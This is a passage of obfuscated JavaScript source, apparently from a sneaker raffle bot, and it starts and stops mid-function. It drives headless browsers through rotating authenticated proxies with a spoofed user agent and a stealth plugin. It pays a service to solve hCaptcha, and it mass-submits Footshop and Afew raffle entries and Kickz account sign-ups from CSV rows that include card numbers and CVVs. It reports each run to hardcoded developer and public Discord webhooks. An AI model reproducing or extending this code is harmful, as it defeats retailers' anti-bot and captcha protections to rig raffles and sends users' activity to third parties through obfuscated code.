    _0x35c6c4['data']['attributes']['properties']['$first_name'] = '' + _0x34ec12[_0x37895a]['FirstName'], _0x35c6c4['data']['attributes']['properties']['$last_name'] = '' + _0x34ec12[_0x37895a]['LastName'], _0x35c6c4['data']['attributes']['properties']['$address1'] = _0x34ec12[_0x37895a]['Address1'] + '\x20' + _0x34ec12[_0x37895a]['Address2'], _0x35c6c4['data']['attributes']['properties']['$zip'] = '' + _0x34ec12[_0x37895a]['Zip'], _0x35c6c4['data']['attributes']['properties']['$city'] = '' + _0x34ec12[_0x37895a]['City'], _0x35c6c4['data']['attributes']['properties']['$country'] = '' + _0x34ec12[_0x37895a]['Country'], _0x35c6c4['data']['attributes']['properties']['Size'] = '' + _0x34ec12[_0x37895a]['Size'], _0x35c6c4['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x34ec12[_0x37895a]['Follower'];
    var _0xc0338a = {
        'jar': _0x3b1a30,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x4f97cc['url'],
        'headers': _0x4f97cc['headers'],
        'body': JSON['stringify'](_0x35c6c4),
        'proxy': 'http://' + _0x2987e1[0x2] + ':' + _0x2987e1[0x3] + '@' + _0x2987e1[0x0] + ':' + _0x2987e1[0x1]
    };
    return _0x5f58a8 === 'ver' && (_0xc0338a['method'] = 'GET'), new Promise(function (_0x5054ca, _0x5e0bad) {
        callback = async (_0x5f0687, _0x5da377, _0x3dc6b2) => {
            !_0x5f0687 && _0x5da377['statusCode'] == 0xca || !_0x5f0687 && _0x5da377['statusCode'] == 0xc8 ? _0x5054ca(console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x4f97cc['name'] + ']\x20Task\x20' + (_0x37895a + 0x1) + ':\x20Raffle\x20Entered!'))) : (_0x5c43b4[0x0]['title'] = 'Failed\x20entry', _0x5c43b4[0x0]['description'] = '' + _0x5f0687, await _0x4f7227(_0x11ec69, _0x4da30c), _0x5e0bad(console['log'](_0x44cc98() + '\x20[' + _0x4f97cc['name'] + ']\x20Task\x20' + (_0x37895a + 0x1) + ':\x20' + _0x5f0687)));
        };
        try {
            _0x5f58a8 === 'ver' ? console['log'](_0x44cc98() + '\x20[' + _0x4f97cc['name'] + ']\x20Task\x20' + (_0x37895a + 0x1) + ':\x20Verifying.') : console['log'](_0x44cc98() + '\x20[' + _0x4f97cc['name'] + ']\x20Task\x20' + (_0x37895a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x35c6c4['data']['attributes']['email']), _0x128d00(_0xc0338a, callback);
        } catch (_0x3bbb25) {
            console['log'](_0x44cc98() + '\x20Task\x20' + (_0x37895a + 0x1) + ':\x20' + _0x3bbb25);
        }
    });
}
;
async function _0x147b6d(_0x90e038, _0xb3120e, _0x2705fc) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3622ac = 0x0; _0x3622ac < _0x90e038['length']; _0x3622ac++) {
        var _0x3f2b0f, _0x23b2f9 = '', _0x469d1a = 0x0, _0x3d6dc8 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Product',
                    'value': '' + _0x90e038[_0x3622ac]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x90e038[_0x3622ac]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }], _0x535b18 = await _0x5e2a41(_0x90e038[_0x3622ac], _0x2705fc, 'dev', ![]), _0xc23d95 = await _0x5e2a41(_0x90e038[_0x3622ac], _0x2705fc, 'pub', ![]);
        const _0xd2ce43 = {
            'succesDEVMSG': { 'embeds': [_0x535b18] },
            'succesPUBMSG': { 'embeds': [_0xc23d95] }
        }, _0x5f35d9 = { 'embeds': _0x3d6dc8 };
        await _0x5c2071(_0x90e038, _0x3622ac);
        if (_0x90e038[_0x3622ac]['Email'] == '' || _0x90e038[_0x3622ac]['FirstName'] == '' || _0x90e038[_0x3622ac]['LastName'] == '' || _0x90e038[_0x3622ac]['Country'] == '' || _0x90e038[_0x3622ac]['Size'] == '' || _0x90e038[_0x3622ac]['Address1'] == '' || _0x90e038[_0x3622ac]['Zip'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x90e038[_0x3622ac]['Email'] == '' || _0x90e038[_0x3622ac]['FirstName'] == '' || _0x90e038[_0x3622ac]['LastName'] == '' || _0x90e038[_0x3622ac]['Country'] == '' || _0x90e038[_0x3622ac]['Size'] == '' || _0x90e038[_0x3622ac]['Address1'] == '' || _0x90e038[_0x3622ac]['Zip'] == '' || _0x90e038[_0x3622ac]['Phone'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0xa4006b = '' + _0x90e038[_0x3622ac]['Url'];
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x35d0d2 = _0xb3120e[_0x3622ac]['split'](':');
        else
            var _0x4cb2e3 = Math['round'](Math['random']() * (_0xb3120e['length'] - 0x1)), _0x35d0d2 = _0xb3120e[_0x4cb2e3]['split'](':');
        const _0x30085b = await _0x15c804['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x35d0d2[0x0] + ':' + _0x35d0d2[0x1]]
        });
        try {
            const _0x74ebe6 = await _0x30085b['newPage']();
            await _0x74ebe6['authenticate']({
                'username': '' + _0x35d0d2[0x2],
                'password': '' + _0x35d0d2[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Getting\x20Session'), await _0x74ebe6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x74ebe6['setRequestInterception'](!![]), _0x74ebe6['on']('request', _0x4ebdea => {
                _0x4ebdea['resourceType']() === 'image' || _0x4ebdea['resourceType']() === 'font' || _0x4ebdea['resourceType']() === 'media' ? _0x4ebdea['abort']() : _0x4ebdea['continue']();
            }), await _0x74ebe6['goto'](_0xa4006b), await _0x238216(0xbb8), await _0x74ebe6['waitForSelector']('.control__JhutY'), await _0x74ebe6['click']('.control__JhutY'), await _0x238216(0x1f4);
            if (_0x90e038[_0x3622ac]['Size'] != 'RANDOM')
                try {
                    const _0x4bda3f = await _0x74ebe6['$x']('//div[contains(text(),\x20\x27' + _0x90e038[_0x3622ac]['Size'] + '\x27)]');
                    await _0x4bda3f[0x0]['click']();
                } catch {
                    console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0xd1b23e = await _0x74ebe6['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x37ede9 = Math['round'](Math['random']() * (_0xd1b23e['length'] - 0x1));
                await _0xd1b23e[_0x37ede9]['click']();
            }
            await _0x238216(0x4b0);
            const _0x60fb7f = await _0x74ebe6['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x60fb7f[0x0]['click'](), await _0x74ebe6['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x74ebe6['type']('input[name=\x22email\x22]', '' + _0x90e038[_0x3622ac]['Email']), await _0x238216(0x640), await _0x74ebe6['type']('input[name=\x22phone\x22]', '' + _0x90e038[_0x3622ac]['Phone']), await _0x238216(0x4b0), await _0x74ebe6['click']('button.btn.continue-button__1RtsS'), await _0x238216(0x4b0);
            try {
                await _0x74ebe6['type']('input[name=\x22firstName\x22]', '' + _0x90e038[_0x3622ac]['FirstName']), await _0x238216(0x258);
            } catch {
                const _0x323ae2 = await _0x74ebe6['$$eval']('.invalid-feedback\x20>\x20div', _0x3419c0 => {
                    return _0x3419c0['map'](_0xe85ee4 => _0xe85ee4['innerText']);
                });
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20' + _0x323ae2));
                continue;
            }
            await _0x74ebe6['type']('input[name=\x22lastName\x22]', '' + _0x90e038[_0x3622ac]['LastName']), await _0x238216(0xc8), await _0x74ebe6['type']('input[name=\x22instagramUsername\x22]', '' + _0x90e038[_0x3622ac]['Follower']), await _0x238216(0x4b0), await _0x74ebe6['click']('button.btn.continue-button__1RtsS'), await _0x238216(0x3e8), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x74ebe6['select']('select[name=\x22country\x22]', '' + _0x90e038[_0x3622ac]['Country']), await _0x238216(0x2bc), await _0x74ebe6['type']('input[name=\x22streetName\x22]', '' + _0x90e038[_0x3622ac]['Address1']), await _0x238216(0x258), await _0x74ebe6['type']('input[name=\x22houseNumber\x22]', _0x90e038[_0x3622ac]['HouseNumber'] + '\x20' + _0x90e038[_0x3622ac]['Address2']), await _0x238216(0xc8), await _0x74ebe6['type']('input[name=\x22postalCode\x22]', '' + _0x90e038[_0x3622ac]['Zip']), await _0x238216(0x1f4), await _0x74ebe6['type']('input[name=\x22city\x22]', '' + _0x90e038[_0x3622ac]['City']), await _0x238216(0x4b0), await _0x74ebe6['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x238216(0x4b0), await _0x74ebe6['click']('button.btn.continue-button__1RtsS'), await _0x238216(0x4b0), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x74ebe6['solveRecaptchas'](), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x238216(0xbb8), await _0x74ebe6['click']('button.btn.continue-button__1RtsS'), await _0x238216(0x1388), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x74ebe6['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x74ebe6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x238216(0x4b0), await _0x74ebe6['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x90e038[_0x3622ac]['CardNumber']), await _0x238216(0x320), await _0x74ebe6['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x74ebe6['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x90e038[_0x3622ac]['ExpiryDate']), await _0x238216(0x4b0), await _0x74ebe6['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x74ebe6['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x90e038[_0x3622ac]['CVV']), await _0x238216(0x226), await _0x74ebe6['type']('input[name=\x22holderName\x22]', '' + _0x90e038[_0x3622ac]['NameOnCard']), await _0x238216(0x226), await _0x74ebe6['click']('button.adyen-checkout__button'), console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x74ebe6['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x238216(0xbb8);
            } catch (_0x52eeb5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x203DS\x20Failed')), _0x3f2b0f = '3DS\x20Error\x20' + _0x52eeb5;
                var _0x20d22e = await _0x5e2a41(_0x90e038[_0x3622ac], _0x2705fc, 'dev', !![], _0x3f2b0f);
                _0xd2ce43['errorDEV'] = { 'embeds': [_0x20d22e] };
                _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0xd2ce43['errorDEV']);
                await _0x4f7227(_0x11ec69, _0xd2ce43['errorDEV']);
                continue;
            }
            console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '')
                try {
                    await _0x4f7227(_0x5eb805['webhook'], _0xd2ce43['succesDEVMSG']);
                } catch {
                }
            await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0xd2ce43['succesDEVMSG']), await _0x238216(0xc8);
            try {
                await _0x4f7227(_0xfe9ed6, _0xd2ce43['succesPUBMSG']);
            } catch {
            }
        } catch (_0x1d6e4e) {
            console['log'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20' + _0x1d6e4e), _0x3f2b0f = '' + _0x1d6e4e;
            var _0x20d22e = await _0x5e2a41(_0x90e038[_0x3622ac], _0x2705fc, 'dev', !![], _0x3f2b0f);
            _0xd2ce43['errorDEV'] = { 'embeds': [_0x20d22e] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0xd2ce43['errorDEV']), await _0x4f7227(_0x11ec69, _0xd2ce43['errorDEV']), _0x23b2f9 = 'yes';
        } finally {
            _0x30085b['close']();
            if (_0x23b2f9 == 'yes' && _0x469d1a != 0x5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2705fc['name'] + ']\x20Task\x20' + (_0x3622ac + 0x1) + '\x20:\x20Retrying')), _0x3622ac = _0x3622ac - 0x1, _0x469d1a = _0x469d1a + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['footshopDelay'] + '\x20ms'), await _0x238216(_0x5eb805['footshopDelay']);
        }
    }
}
afewFunction = async (_0x9ffc80, _0x5ecdd7, _0x39cb3d, _0x2e0d1d, _0x4e49e1) => {
    for (var _0x4c6046 = 0x0; _0x4c6046 < _0x2e0d1d['length']; _0x4c6046++) {
        var _0x3ffa80, _0x48c78c = '', _0x56a9f8 = 0x0;
        _0x2e0d1d[_0x4c6046]['Url'] = _0x9ffc80, _0x52fa74(_0x39cb3d['name'] + '\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20/\x20' + _0x2e0d1d['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x2e0d1d, _0x4c6046);
        var _0x133ffe = await _0x5e2a41(_0x2e0d1d[_0x4c6046], _0x39cb3d, 'dev', ![]), _0x1d19a7 = await _0x5e2a41(_0x2e0d1d[_0x4c6046], _0x39cb3d, 'pub', ![]);
        const _0x29cd63 = {
            'succesDEVMSG': { 'embeds': [_0x133ffe] },
            'succesPUBMSG': { 'embeds': [_0x1d19a7] }
        };
        if (_0x2e0d1d[_0x4c6046]['Email'] == '' || _0x2e0d1d[_0x4c6046]['FirstName'] == '' || _0x2e0d1d[_0x4c6046]['LastName'] == '' || _0x2e0d1d[_0x4c6046]['Country'] == '' || _0x2e0d1d[_0x4c6046]['Size'] == '' || _0x2e0d1d[_0x4c6046]['Address1'] == '' || _0x2e0d1d[_0x4c6046]['Zip'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x42a162 = _0x4e49e1[_0x4c6046]['split'](':');
        else
            var _0x2ac9a4 = Math['round'](Math['random']() * (_0x4e49e1['length'] - 0x1)), _0x42a162 = _0x4e49e1[_0x2ac9a4]['split'](':');
        const _0x55f0ef = await _0x15c804['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x42a162[0x0] + ':' + _0x42a162[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xd30213 = await _0x55f0ef['newPage']();
            await _0xd30213['setDefaultNavigationTimeout'](0x1d4c0), await _0xd30213['authenticate']({
                'username': '' + _0x42a162[0x2],
                'password': '' + _0x42a162[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd30213['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xd30213['setRequestInterception'](!![]), _0xd30213['on']('request', _0x53aea0 => {
                _0x53aea0['resourceType']() === 'image' || _0x53aea0['resourceType']() === 'font' || _0x53aea0['resourceType']() === 'media' ? _0x53aea0['abort']() : _0x53aea0['continue']();
            }), await _0xd30213['goto'](_0x9ffc80, { 'waitUntil': 'networkidle2' }), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0xd30213['waitForTimeout'](0xfa0), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Cookies\x20received'), await _0xd30213['waitForTimeout'](0x320);
            if (_0x2e0d1d[_0x4c6046]['Size'] == 'RANDOM') {
                console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x3a985a = await _0xd30213['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x57f8c6 => {
                    return _0x57f8c6['map'](_0x1976b4 => _0x1976b4['href']);
                });
                var _0x15533c = Math['round'](Math['random']() * (_0x3a985a['length'] - 0x1));
                await _0xd30213['goto']('' + _0x3a985a[_0x15533c]);
            } else {
                console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2e0d1d[_0x4c6046]['Size']);
                try {
                    const _0x3bb860 = await _0xd30213['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x2e0d1d[_0x4c6046]['Size'] + '\x22]\x20>\x20a', _0x2673ff => {
                        return _0x2673ff['map'](_0x251d7a => _0x251d7a['href']);
                    });
                    await _0xd30213['goto']('' + _0x3bb860[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x31bbfc) {
                    console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20' + _0x31bbfc + '\x20Size\x20not\x20found')), _0x3ffa80 = 'Size\x20Not\x20Found';
                    var _0xeb2f3b = await _0x5e2a41(_0x2e0d1d[_0x4c6046], _0x39cb3d, 'dev', !![], _0x3ffa80);
                    _0x29cd63['errorDEV'] = { 'embeds': [_0xeb2f3b] };
                    _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x29cd63['errorDEV']);
                    await _0x4f7227(_0x11ec69, _0x29cd63['errorDEV']);
                    continue;
                }
            }
            await _0xd30213['waitForTimeout'](0x258), await _0xd30213['type']('#raffle-instagram', '' + _0x2e0d1d[_0x4c6046]['Follower'], { 'delay': 0x64 }), await _0xd30213['waitForTimeout'](0x384), await _0xd30213['click']('#raffle-terms'), await _0xd30213['waitForTimeout'](0x384), await _0xd30213['evaluate'](() => {
                const _0x1933cf = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x1933cf['click']();
            }), await _0xd30213['waitForTimeout'](0xbb8), await _0xd30213['waitForSelector']('#checkout_email'), await _0x238216(0x3e8), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x5ecdd7 == 'sec' ? await _0xd30213['type']('#checkout_email', '' + _0x2e0d1d[_0x4c6046]['FirstName'] + _0x2e0d1d[_0x4c6046]['LastName'] + _0x5eb805['catchall'], 0x32) : await _0xd30213['type']('#checkout_email', '' + _0x2e0d1d[_0x4c6046]['Email'], 0x32);
            await _0x238216(0x320), await _0xd30213['select']('#checkout_shipping_address_country', '' + _0x2e0d1d[_0x4c6046]['Country']), await _0xd30213['waitForTimeout'](0x258), await _0xd30213['type']('#checkout_shipping_address_first_name', '' + _0x2e0d1d[_0x4c6046]['FirstName']), await _0xd30213['waitForTimeout'](0x320), await _0xd30213['type']('#checkout_shipping_address_last_name', '' + _0x2e0d1d[_0x4c6046]['LastName']), await _0xd30213['waitForTimeout'](0x2bc), await _0xd30213['type']('#checkout_shipping_address_address1', _0x2e0d1d[_0x4c6046]['Address1'] + '\x20' + _0x2e0d1d[_0x4c6046]['HouseNumber']), await _0xd30213['waitForTimeout'](0x2bc), await _0xd30213['type']('#checkout_shipping_address_address2', '' + _0x2e0d1d[_0x4c6046]['Address2']), await _0xd30213['waitForTimeout'](0x2bc);
            _0x2e0d1d[_0x4c6046]['Postcode'] == undefined ? await _0xd30213['type']('#checkout_shipping_address_zip', '' + _0x2e0d1d[_0x4c6046]['Zip']) : await _0xd30213['type']('#checkout_shipping_address_zip', '' + _0x2e0d1d[_0x4c6046]['Postcode']);
            await _0xd30213['waitForTimeout'](0x2bc), await _0xd30213['type']('#checkout_shipping_address_city', '' + _0x2e0d1d[_0x4c6046]['City']), await _0xd30213['waitForTimeout'](0x2bc), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xd30213, _0xd30213['evaluate'](() => {
                const _0x29c823 = document['querySelector']('#continue_button');
                for (var _0x18a488 = 0x0; _0x18a488 < 0x5; _0x18a488++) {
                    if (_0x29c823) {
                        _0x29c823['click'](), _0x29c823['click']();
                        break;
                    } else
                        _0x238216(0xfa0);
                }
            }), await _0xd30213['waitForTimeout'](0x1194);
            try {
                await _0xd30213['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0xd30213['evaluate'](() => {
                const _0x4ef836 = document['querySelector']('#continue_button');
                for (var _0x5a14ee = 0x0; _0x5a14ee < 0x5; _0x5a14ee++) {
                    if (_0x4ef836) {
                        _0x4ef836['click']();
                        break;
                    } else
                        _0x238216(0xfa0);
                }
            }), await _0xd30213['waitForTimeout'](0x7d0), console['log'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xd30213['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0xd30213['evaluate'](() => {
                const _0x4610a4 = document['querySelector']('#continue_button');
                for (var _0x488f31 = 0x0; _0x488f31 < 0x5; _0x488f31++) {
                    if (_0x4610a4) {
                        _0x4610a4['click']();
                        break;
                    } else
                        _0x238216(0xfa0);
                }
            }), await _0xd30213['waitForTimeout'](0x1194), await _0xd30213['waitForSelector']('#continue_button'), _0xd30213['evaluate'](() => {
                const _0x2e2a44 = document['querySelector']('#continue_button');
                for (var _0x3d2c57 = 0x0; _0x3d2c57 < 0x5; _0x3d2c57++) {
                    if (_0x2e2a44) {
                        _0x2e2a44['click']();
                        break;
                    } else
                        _0x238216(0xfa0);
                }
            });
            try {
                await _0xd30213['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '')
                    try {
                        await _0x4f7227(_0x5eb805['webhook'], _0x29cd63['succesDEVMSG']);
                    } catch {
                    }
                await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0x29cd63['succesDEVMSG']), await _0x238216(0xc8);
                try {
                    await _0x4f7227(_0xfe9ed6, _0x29cd63['succesPUBMSG']);
                } catch {
                }
            } catch (_0x9bdcf6) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x9bdcf6));
            }
        } catch (_0x5a047d) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20' + _0x5a047d)), _0x3ffa80 = '' + _0x5a047d;
            var _0xeb2f3b = await _0x5e2a41(_0x2e0d1d[_0x4c6046], _0x39cb3d, 'dev', !![], _0x3ffa80);
            _0x29cd63['errorDEV'] = { 'embeds': [_0xeb2f3b] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x29cd63['errorDEV']), await _0x4f7227(_0x11ec69, _0x29cd63['errorDEV']), _0x48c78c = 'yes';
        } finally {
            _0x55f0ef && _0x55f0ef['close']();
            if (_0x48c78c == 'yes' && _0x56a9f8 != 0x5 && _0x3ffa80 != 'Size\x20Not\x20Found') {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x39cb3d['name'] + ']\x20Task\x20' + (_0x4c6046 + 0x1) + '\x20:\x20Retrying')), _0x4c6046 = _0x4c6046 - 0x1, _0x56a9f8 = _0x56a9f8 + 0x1;
                continue;
            }
            if (_0x4c6046 + 0x1 == _0x2e0d1d['length']) {
                console['log'](_0xc5437b['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x238216(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['AfewDelay'] + '\x20ms'), await _0x238216(_0x5eb805['AfewDelay']);
        }
    }
};
async function _0x3067ed(_0x5a0c8c, _0x1297a8, _0x16afaa, _0x1d55ef) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x17f739 = 0x0; _0x17f739 < _0x16afaa['length']; _0x17f739++) {
        var _0x3d5321 = '', _0x2ac7c1 = 0x0;
        _0x52fa74(_0x1297a8['name'] + '\x20Task\x20' + (_0x17f739 + 0x1) + '\x20/\x20' + _0x16afaa['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x16afaa, _0x17f739);
        var _0x333e3d = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }];
        const _0x597fdb = { 'embeds': _0x333e3d };
        var _0x185569 = await _0x5e2a41(_0x16afaa[_0x17f739], _0x1297a8, 'acc', ![]);
        const _0x2051db = { 'succesDEVMSG': { 'embeds': [_0x185569] } };
        if (_0x16afaa[_0x17f739]['Email'] == '' || _0x16afaa[_0x17f739]['FirstName'] == '' || _0x16afaa[_0x17f739]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x16afaa[_0x17f739]['Password'] == '' && (_0x16afaa[_0x17f739]['Password'] = 'JRaffles23!');
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x18d7d3 = _0x1d55ef[_0x17f739]['split'](':');
        else
            var _0x31e052 = Math['round'](Math['random']() * (_0x1d55ef['length'] - 0x1)), _0x18d7d3 = _0x1d55ef[_0x31e052]['split'](':');
        const _0x366bc2 = await _0x15c804['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x18d7d3[0x0] + ':' + _0x18d7d3[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x487a87 = await _0x366bc2['newPage']();
            await _0x487a87['authenticate']({
                'username': '' + _0x18d7d3[0x2],
                'password': '' + _0x18d7d3[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x487a87['setRequestInterception'](!![]), _0x487a87['on']('request', _0x1dc284 => {
